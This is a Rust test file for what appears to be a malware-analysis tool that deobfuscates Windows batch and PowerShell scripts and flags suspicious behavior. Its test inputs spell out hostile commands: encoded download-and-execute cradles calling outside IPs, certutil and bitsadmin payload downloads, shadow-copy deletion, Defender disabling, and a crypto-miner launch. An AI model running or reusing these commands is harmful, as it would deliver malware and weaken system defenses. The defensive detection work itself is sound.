        let script = "> \u{20B3}\u{20B3}out > real.txt\r\necho hi\r\n".as_bytes();
        let _ = analyze(script, &Config::default());
    }
}

#[cfg(test)]
mod cjk_padding_tests {
    use crate::env::{Config, Environment};
    use crate::lex::lex;
    use crate::normalize::normalize_to_string;

    #[test]
    fn cjk_padded_var_substitution_does_not_panic() {
        let mut env = Environment::new(&Config::default());
        env.set("X", "abc\u{20B3}def\u{20B3}ghi");
        let toks = lex("%X:def=zzz%");
        let _ = normalize_to_string(&toks, &mut env);
    }

    #[test]
    fn long_cjk_padding_chain() {
        let mut env = Environment::new(&Config::default());
        let huge: String =
            "\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}\u{4EAC}"
                .repeat(20);
        env.set("X", &huge);
        let toks = lex("%X:\u{4EAC}=A%");
        let out = normalize_to_string(&toks, &mut env);
        assert_eq!(out, "A".repeat(200));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod certutil_tests {
    use crate::analyze;
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;
    use crate::traits::Trait;
    use base64::Engine;

    fn b64(s: &str) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(s.as_bytes())
    }

    #[test]
    fn certutil_decode_emits_trait_and_writes_fs_entry() {
        let mut env = Environment::new(&Config::default());
        let payload = "hello world";
        env.modified_filesystem.insert(
            "src.b64".to_string(),
            FsEntry::Content {
                content: b64(payload).into_bytes(),
                append: false,
            },
        );
        interpret_line("certutil -decode src.b64 dst.bin", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::CertutilDecode { src, dst, .. } if src == "src.b64" && dst == "dst.bin"
            )
        });
        assert!(has, "no CertutilDecode trait: {:?}", env.traits);
        if let Some(FsEntry::Decoded { content, .. }) = env.modified_filesystem.get("dst.bin") {
            assert_eq!(&content[..], payload.as_bytes());
        } else {
            panic!(
                "dst.bin not Decoded: {:?}",
                env.modified_filesystem.get("dst.bin")
            );
        }
    }

    #[test]
    fn certutil_decode_pe_adds_recovered_blob() {
        let mut env = Environment::new(&Config::default());
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        env.modified_filesystem.insert(
            "src.b64".to_string(),
            FsEntry::Content {
                content: base64::engine::general_purpose::STANDARD
                    .encode(&pe)
                    .into_bytes(),
                append: false,
            },
        );

        interpret_line("certutil -decode src.b64 dst.exe", &mut env);

        assert!(
            env.recovered_pe
                .iter()
                .any(|(label, blob)| label == "certutil-decode:dst.exe" && blob == &pe),
            "decoded PE was not exposed as recovered blob: {:?}",
            env.recovered_pe
        );
    }

    #[test]
    fn certutil_decode_skips_optional_force_flag() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "src.b64".to_string(),
            FsEntry::Content {
                content: b64("hello").into_bytes(),
                append: false,
            },
        );

        interpret_line("certutil -decode -f src.b64 dst.bin", &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::CertutilDecode { src, dst, src_resolved }
                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
            )),
            "certutil -decode -f paths were not parsed: {:?}",
            env.traits
        );
        assert!(
            matches!(
                env.modified_filesystem.get("dst.bin"),
                Some(FsEntry::Decoded { content, .. }) if content == b"hello"
            ),
            "dst.bin was not decoded: {:?}",
            env.modified_filesystem.get("dst.bin")
        );
    }

    #[test]
    fn certutil_decodehex_accepts_offset_dump_rows() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "src.hex".to_string(),
            FsEntry::Content {
                content: b"0000  68 65 6c 6c 6f  |hello|\r\n0005  20 77 6f 72 6c 64  | world|\r\n"
                    .to_vec(),
                append: false,
            },
        );

        interpret_line("certutil -decodehex src.hex dst.bin", &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::CertutilDecode { src, dst, src_resolved }
                    if src == "src.hex" && dst == "dst.bin" && *src_resolved
            )),
            "certutil -decodehex trait missing: {:?}",
            env.traits
        );
        assert!(
            matches!(
                env.modified_filesystem.get("dst.bin"),
                Some(FsEntry::Decoded { content, .. }) if content == b"hello world"
            ),
            "dst.bin was not decoded from offset hex dump: {:?}",
            env.modified_filesystem.get("dst.bin")
        );
    }

    #[test]
    fn certutil_decode_self_basename_resolves_with_input_path() {
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
        let script = format!(
            "certutil -decode -f %~nx0 payload.exe\r\n-----BEGIN CERTIFICATE-----\r\n{b64}\r\n-----END CERTIFICATE-----\r\n"
        );

        let report = crate::analyze_with_path(
            script.as_bytes(),
            &Config::default(),
            std::path::Path::new(r"C:\Users\al\Downloads\invoice.cmd"),
        );

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::CertutilDecode { src, dst, src_resolved }
                    if src == "invoice.cmd" && dst == "payload.exe" && *src_resolved
            )),
            "self basename certutil source was not resolved: {:?}",
            report.traits
        );
        assert!(
            report
                .recovered_pe
                .iter()
                .any(|(label, blob)| label == "certutil-decode:payload.exe" && blob == &pe),
            "self-decoded PE was not exported: {:?}",
            report
                .recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn certutil_decode_self_new_certificate_request_recovers_pe() {
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
        let script = format!(
            "certutil -decode \"%~f0\" payload.exe\r\n-----BEGIN NEW CERTIFICATE REQUEST-----\r\n{b64}\r\n-----END NEW CERTIFICATE REQUEST-----\r\n"
        );

        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::CertutilDecode { src, dst, src_resolved }
                    if src == "%~f0" && dst == "payload.exe" && *src_resolved
            )),
            "self certutil decode trait missing/resolution false: {:?}",
            report.traits
        );
        assert!(
            report
                .recovered_pe
                .iter()
                .any(|(label, blob)| label == "certutil-decode:payload.exe" && blob == &pe),
            "NEW CERTIFICATE REQUEST PE was not recovered: {:?}",
            report
                .recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn long_pe_base64_carrier_line_is_summarized() {
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe.resize(12_288, 0);
        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
        let script = format!(
            "findstr /V marker \"%0\" > payload.b64\r\n{b64}\r\ncertutil -decode payload.b64 payload.dll\r\nrundll32 payload.dll,x\r\n"
        );

        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted base64 PE carrier"),
            "PE carrier was not summarized:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains(&b64[..256]),
            "raw PE base64 carrier leaked into deob output"
        );
    }

    #[test]
    fn unreachable_raw_pem_pe_carrier_is_exported() {
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe.resize(12_289, 0);
        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
        let wrapped = b64
            .as_bytes()
            .chunks(64)
            .map(|chunk| std::str::from_utf8(chunk).expect("ascii"))
            .collect::<Vec<_>>()
            .join("\r\n");
        let script = format!(
            "goto :eof\r\n-----BEGIN CERTIFICATE-----\r\n{wrapped}\r\n-----END CERTIFICATE-----\r\n"
        );

        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report
                .recovered_pe
                .iter()
                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
            "unreachable raw PEM PE carrier was not exported: {:?}",
            report
                .recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn certutil_decoded_pe_command_strings_are_scanned_for_behavior() {
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe.extend_from_slice(b"vssadmin delete shadows /all /quiet");
        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
        let script =
            format!("echo {b64}>payload.b64\r\ncertutil -decode payload.b64 payload.dll\r\n");
        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::AntiRecovery { action } if action == "vssadmin-delete-shadows"
                )
            }),
            "decoded PE behavior string was not scanned: {:?}",
            report.traits
        );
    }

    #[test]
    fn certutil_decoded_pe_utf16_command_strings_are_scanned_for_behavior() {
        let mut pe = vec![0u8; 0x84];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        for unit in "Set-MpPreference -DisableRealtimeMonitoring $true".encode_utf16() {
            pe.extend_from_slice(&unit.to_le_bytes());
        }
        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
        let script =
            format!("echo {b64}>payload.b64\r\ncertutil -decode payload.b64 payload.dll\r\n");
        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::DefenderEvasion { action, .. }
                        if action == "setmp-disablerealtimemonitoring"
                )
            }),
            "decoded PE UTF-16 behavior string was not scanned: {:?}",
            report.traits
        );
    }

    #[test]
    fn certutil_urlcache_emits_download_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            "certutil -urlcache -split -f http://x/y.exe out.exe",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::CertutilDownload { url, dst } if url == "http://x/y.exe" && dst == "out.exe"
            )
        });
        assert!(has, "no CertutilDownload trait: {:?}", env.traits);
    }

    #[test]
    fn certutil_urlcache_accepts_quoted_mixed_case_backslash_url() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"certutil -urlcache -split -f "hTtP:\\cert.example\y.exe" out.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::CertutilDownload { url, dst } if url == "http://cert.example/y.exe" && dst == "out.exe"
            )
        });
        assert!(has, "no liberal CertutilDownload trait: {:?}", env.traits);
    }

    #[test]
    fn certutil_decode_unresolved_src_still_emits_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line("certutil -decode missing.b64 dst.bin", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::CertutilDecode {
                    src_resolved: false,
                    ..
                }
            )
        });
        assert!(
            has,
            "no CertutilDecode with src_resolved=false: {:?}",
            env.traits
        );
        assert!(!env.modified_filesystem.contains_key("dst.bin"));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod bitsadmin_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn bitsadmin_transfer_emits_download() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            "bitsadmin /transfer myjob /Download /Priority FOREGROUND http://x/y.exe C:\\temp\\y.exe",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::BitsadminDownload { url, dst }
                    if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
            )
        });
        assert!(has, "no BitsadminDownload: {:?}", env.traits);
    }

    #[test]
    fn bitsadmin_transfer_accepts_schemeless_domain_path() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"bitsadmin /transfer "mdj" /download /priority FOREGROUND "courtage-psd.com/Beopajki.exe" "%temp%\out.exe""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::BitsadminDownload { url, dst }
                    if url == "http://courtage-psd.com/Beopajki.exe" && dst == "%temp%\\out.exe"
            )
        });
        assert!(has, "no schemeless BitsadminDownload: {:?}", env.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod wmic_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn wmic_process_call_create_extracts_inner() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"wmic process call create "cmd /c echo hi""#, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::WmicProcessCreate { inner_cmd } if inner_cmd.contains("echo hi")
            )
        });
        assert!(has, "no WmicProcessCreate: {:?}", env.traits);
        assert!(
            env.exec_cmd.iter().any(|c| c.contains("echo hi")),
            "no recursive cmd: {:?}",
            env.exec_cmd
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod cscript_tests {
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn cscript_with_vbs_content_extracts_payload() {
        let mut env = Environment::new(&Config::default());
        let vbs_content = b"WScript.Echo \"hi\"\r\n".to_vec();
        env.modified_filesystem.insert(
            "dropper.vbs".to_string(),
            FsEntry::Content {
                content: vbs_content.clone(),
                append: false,
            },
        );
        interpret_line("cscript //nologo dropper.vbs", &mut env);
        let has = env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::CscriptExec { src } if src == "dropper.vbs"));
        assert!(has, "no CscriptExec: {:?}", env.traits);
        assert!(
            env.exec_vbs.iter().any(|c| c == &vbs_content),
            "vbs not extracted"
        );
    }

    #[test]
    fn wscript_with_js_content_extracts_payload() {
        let mut env = Environment::new(&Config::default());
        let js_content = b"WScript.Echo('hi')\r\n".to_vec();
        env.modified_filesystem.insert(
            "drop.js".to_string(),
            FsEntry::Content {
                content: js_content.clone(),
                append: false,
            },
        );
        interpret_line("wscript drop.js", &mut env);
        assert!(
            env.exec_jscript.iter().any(|c| c == &js_content),
            "js not extracted"
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod extrac32_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn extrac32_self_reference_records_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"extrac32 /y "C:\Users\al\Downloads\script.bat" "%temp%\dropped.exe""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Extrac32 {
                    self_reference: true,
                    ..
                }
            )
        });
        assert!(has, "no Extrac32 self_reference: {:?}", env.traits);
    }
}

#[cfg(test)]
mod tokenizer_misc_tests {
    use crate::interp::command_name;

    #[test]
    fn echo_dot_resolves_to_echo() {
        assert_eq!(command_name("echo.").as_deref(), Some("echo"));
        assert_eq!(command_name("echo. some text").as_deref(), Some("echo"));
    }
}

#[cfg(test)]
mod exit_continue_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn top_level_exit_b_continues_for_ioc_extraction() {
        // Real-world pattern: admin-gate guards the payload
        let script = b"if not \"%1\"==\"am_admin\" ( echo GATED & exit /b )\r\necho REAL_PAYLOAD url=http://x/y.exe\r\n";
        let report = analyze(script, &Config::default());
        // Both branches should be visible in deob output
        assert!(
            report.deobfuscated.contains("echo REAL_PAYLOAD"),
            "missing payload after gate, got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn top_level_exit_bare_continues() {
        let script = b"exit\r\necho AFTER_EXIT\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo AFTER_EXIT"),
            "exit halted top-level drive, got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn top_level_goto_eof_continues() {
        let script = b"goto :eof\r\necho AFTER_GOTOEOF\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo AFTER_GOTOEOF"),
            "goto :eof halted top-level drive, got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_label_eof_still_returns_to_caller() {
        // Inside a call frame, eof should pop normally
        let script =
            b"call :sub\r\necho AFTER_CALL\r\ngoto :eof\r\n:sub\r\necho IN_SUB\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        let lines: Vec<&str> = report
            .deobfuscated
            .lines()
            .filter(|l| l.starts_with("echo "))
            .collect();
        // Expected order: IN_SUB then AFTER_CALL
        assert_eq!(
            lines,
            vec!["echo IN_SUB", "echo AFTER_CALL"],
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn branch_local_exit_b_does_not_skip_rest_of_called_subroutine() {
        let script = b"call :outer\r\necho AFTER_OUTER\r\ngoto :eof\r\n\
            :outer\r\n\
            call :admin\r\n\
            echo OUTER_CONTINUED\r\n\
            exit /b\r\n\
            :admin\r\n\
            if not %errorlevel% EQU 0 (\r\n\
            echo ADMIN_BRANCH\r\n\
            exit /b\r\n\
            )\r\n\
            exit /b\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo ADMIN_BRANCH"),
            "missing branch body, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("echo OUTER_CONTINUED"),
            "branch-local exit /b skipped outer subroutine continuation, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("echo AFTER_OUTER"),
            "outer subroutine did not return to caller, got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn sibling_calls_continue_after_nested_admin_subroutine() {
        let script = b"call :CURRDIR\r\n\
            call :EXCLUDE\r\n\
            call :EXTRACT\r\n\
            goto :eof\r\n\
            :CURRDIR\r\n\
            echo CURRDIR\r\n\
            EXIT /B\r\n\
            :EXCLUDE\r\n\
            call :ADMIN\r\n\
            echo EXCLUDE_CONTINUED\r\n\
            EXIT /B\r\n\
            :EXTRACT\r\n\
            miner.exe --proto stratum --algo etchash --server etchash.infinityton.com:4445 --user wallet.worker\r\n\
            EXIT /B\r\n\
            :ADMIN\r\n\
            if not %errorlevel% EQU 0 (\r\n\
            echo ADMIN_BRANCH\r\n\
            EXIT\r\n\
            )\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo EXCLUDE_CONTINUED"),
            "nested admin call prevented exclude continuation, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("etchash.infinityton.com:4445"),
            "sibling extract call was skipped, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::RemoteConnect { host, port, .. }
                    if host == "etchash.infinityton.com" && *port == 4445
            )),
            "miner endpoint not surfaced: {:?}\ndeob:\n{}",
            report.traits,
            report.deobfuscated
        );
    }
}

#[cfg(test)]
mod inline_if_tests {
    use crate::{analyze, Config};

    #[test]
    fn inline_if_true_recurses_into_body() {
        let script = b"if 1 equ 1 set X=value\r\necho %X%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn inline_if_false_does_not_run_body() {
        let script = b"if 1 equ 2 set X=value\r\necho %X%\r\n";
        let report = analyze(script, &Config::default());
        // X never set, so %X% expands to empty
        assert!(
            !report.deobfuscated.contains("echo value"),
            "got:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod quoted_semicolon_tests {
    use crate::env::{Config, Environment};
    use crate::lex::lex;
    use crate::normalize::normalize_to_string;

    #[test]
    fn semicolon_inside_double_quotes_preserved() {
        let mut env = Environment::new(&Config::default());
        let out = normalize_to_string(&lex(r#"echo "a; b; c""#), &mut env);
        // The output should retain the semicolons
        assert!(out.contains("a; b; c"), "semicolons stripped: {:?}", out);
    }

    #[test]
    fn variable_in_quoted_string_still_expands() {
        let mut env = Environment::new(&Config::default());
        env.set("X", "value");
        let out = normalize_to_string(&lex(r#"echo "x=%X%; y=2""#), &mut env);
        assert!(out.contains("x=value; y=2"), "got: {:?}", out);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod trait_dedup_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn excess_arithmetic_events_get_deduped() {
        // 1000 set /a calls — should emit 100 (cap) + 1 TraitsCapped
        let mut script = String::new();
        for i in 0..1000u32 {
            script.push_str(&format!("set /a X={}+{}\r\n", i, i + 1));
        }
        let cfg = Config {
            max_traits_per_kind: 100,
            ..Config::default()
        };
        let report = analyze(script.as_bytes(), &cfg);
        let arith_count = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Arithmetic { .. }))
            .count();
        assert!(
            arith_count <= 100,
            "expected ≤100 Arithmetic events, got {}",
            arith_count
        );
        let capped = report.traits.iter().any(
            |t| matches!(t, Trait::TraitsCapped { capped_kind, .. } if capped_kind == "Arithmetic"),
        );
        assert!(capped, "no TraitsCapped trait emitted");
    }

    #[test]
    fn exact_duplicate_download_traits_are_deduped_before_capping() {
        let script = b":loop\r\ncurl http://82.65.68.158/yl1.ps1\r\ngoto loop\r\n";
        let cfg = Config {
            max_traits_per_kind: 100,
            ..Config::default()
        };
        let report = analyze(script, &cfg);
        let downloads: Vec<_> = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Download { .. }))
            .collect();
        assert_eq!(
            downloads.len(),
            1,
            "duplicate downloads not deduped: {:?}",
            report.traits
        );
        let capped = report.traits.iter().any(
            |t| matches!(t, Trait::TraitsCapped { capped_kind, .. } if capped_kind == "Download"),
        );
        assert!(
            !capped,
            "duplicate downloads caused cap: {:?}",
            report.traits
        );
    }

    #[test]
    fn repeated_download_iocs_are_deduped_even_when_command_context_differs() {
        let script = b"powershell -Command \"curl http://82.65.68.158/yl1.ps1\"\r\npowershell -Command \"iwr http://82.65.68.158/yl1.ps1\"\r\npowershell -Command \"(New-Object Net.WebClient).DownloadString('http://82.65.68.158/yl1.ps1')\"\r\n";
        let cfg = Config {
            max_traits_per_kind: 2,
            ..Config::default()
        };
        let report = analyze(script, &cfg);
        let downloads: Vec<_> = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Download { .. }))
            .collect();
        assert_eq!(
            downloads.len(),
            1,
            "semantic duplicate downloads not deduped: {:?}",
            report.traits
        );
        let capped = report.traits.iter().any(
            |t| matches!(t, Trait::TraitsCapped { capped_kind, .. } if capped_kind == "Download"),
        );
        assert!(
            !capped,
            "duplicate downloads caused cap: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod ps1_url_extraction_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine;

    fn encode(payload: &str) -> String {
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn iwr_url_extracted_from_encoded_payload() {
        let ps = r#"Invoke-WebRequest -Uri "http://x.example/y.exe" -OutFile "z.exe""#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.example/y.exe")
            )
        });
        assert!(has, "no Download trait from IWR: {:?}", report.traits);
    }

    #[test]
    fn iwr_quoted_outfile_with_spaces_preserves_destination() {
        let ps = r#"Invoke-WebRequest -Uri "http://x.example/spaced.exe" -OutFile "C:\Users\Public\stage one.exe""#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://x.example/spaced.exe"
                        && dst.as_deref() == Some("C:\\Users\\Public\\stage one.exe")
            )
        });
        assert!(
            has,
            "quoted OutFile path with spaces was not preserved: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps_backtick_line_continuation_resolves_cmdlet_name() {
        let ps =
            "Invoke-Web`\r\nRequest -Uri \"http://x.example/continued.exe\" -OutFile \"z.exe\"";
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://x.example/continued.exe" && dst.as_deref() == Some("z.exe")
            )
        });
        assert!(
            has,
            "no Download trait from PS backtick continuation: {:?}",
            report.traits
        );
    }

    #[test]
    fn iwr_liberal_slash_mixed_case_url_is_structured_download() {
        let ps = r#"Invoke-WebRequest -Uri "hTtP:\\liberal.example\drop.exe" -OutFile "drop.exe""#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://liberal.example/drop.exe" && dst.as_deref() == Some("drop.exe")
            )
        });
        assert!(
            has,
            "no structured Download trait from liberal IWR URL: {:?}",
            report.traits
        );
    }

    #[test]
    fn webclient_downloaddata_concatenated_variable_url_extracted() {
        let ps = r#"$ser=$('http://147.182.170.15:9090');$t='/admin/get.php';$wc=New-Object Net.WebClient;$wc.DownloadData($Ser+$T)"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let expected = "http://147.182.170.15:9090/admin/get.php";
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == expected
            )
        });
        assert!(
            has,
            "no Download trait for concatenated DownloadData URL: {:?}",
            report.traits
        );
    }

    #[test]
    fn iwr_positional_url_after_flags_extracted() {
        let ps = r#"IWR -useb 'https://iwr.example/payload.js' -outf $env:TEMP\payload.js"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://iwr.example/payload.js"
            )
        });
        assert!(
            has,
            "no Download trait from IWR positional URL after flags: {:?}",
            report.traits
        );
    }

    #[test]
    fn irm_schemeless_ip_url_extracted_as_download() {
        let ps = r#"iex(irm '91.92.34.126:6600' -UseBasicParsing)"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://91.92.34.126:6600"
            )
        });
        assert!(
            has,
            "no Download trait from schemeless IRM IP: {:?}",
            report.traits
        );
        let generic_count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "http://91.92.34.126:6600")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "schemeless IRM IP double-emitted: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_full_path_curl_exe_url_extracted() {
        let ps = r#"c:\windows\system32\curl.exe https://curlps.example/up.zip -o C:\Temp\up.zip"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curlps.example/up.zip" && dst.as_deref() == Some("C:\\Temp\\up.zip")
            )
        });
        assert!(
            has,
            "no Download trait from full-path curl.exe in PowerShell: {:?}",
            report.traits
        );
    }

    #[test]
    fn embedded_conhost_powershell_encoded_url_extracted() {
        let ps = r#"(New-Object Net.WebClient).DownloadString("https://embedded.example/g.txt")"#;
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        let script = format!(
            r#"C:\Windows\System32 > C:\Windows\System32\conhost.exe powershell -nop -enc {b64}"#
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == "https://embedded.example/g.txt")
            }),
            "embedded PowerShell URL missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn encoded_powershell_mshta_clipboard_command_url_extracted() {
        let ps = r#"scb 'mshta https://clip.example/claim.mp4';iex (gcb)"#;
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        let script = format!(r#"powershell.exe powershell -E {b64}"#);
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == "https://clip.example/claim.mp4")
            }),
            "encoded mshta clipboard URL missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn encoded_powershell_constructed_iwr_alias_url_extracted() {
        let ps = r#"$d='down your files';IeX(&($d[11]+$d[2]+$d[8]) -useb https://generic.example/example.mp4)"#;
